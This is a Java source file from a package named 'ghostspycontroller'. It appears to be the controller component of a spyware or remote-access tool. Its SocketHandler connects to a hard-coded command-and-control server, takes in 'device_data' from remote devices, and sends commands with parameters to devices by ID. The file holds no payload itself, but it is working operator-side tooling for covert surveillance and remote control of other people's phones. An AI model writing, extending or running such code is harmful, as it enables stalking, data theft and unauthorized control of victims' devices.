package com.ghostspycontroller;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class SocketHandler {
    private static Socket socket;
    private static final String SERVER_URL = "https://ghostspy.bruang.biz.id";
    private static MainActivity activity;

    public static void init(MainActivity act) {
        activity = act;
        try {
            socket = IO.socket(SERVER_URL);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public static void connect() {
        if (socket == null) return;
        socket.on(Socket.EVENT_CONNECT, args -> {
            if (activity != null) activity.updateConnectionStatus(true);
        });
        socket.on("device_data", args -> {
            if (activity != null) activity.handleIncomingData((JSONObject) args[0]);
        });
        socket.on(Socket.EVENT_DISCONNECT, args -> {
            if (activity != null) activity.updateConnectionStatus(false);
        });
        socket.connect();
    }

    public static void sendCommand(String deviceId, String command, JSONObject params) {
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("device_id", deviceId);
            msg.put("command", command);
            msg.put("params", params);
            socket.emit("command", msg);
        } catch (Exception e) {}
    }

    public static boolean isConnected() {
        return socket != null && socket.connected();
    }
}
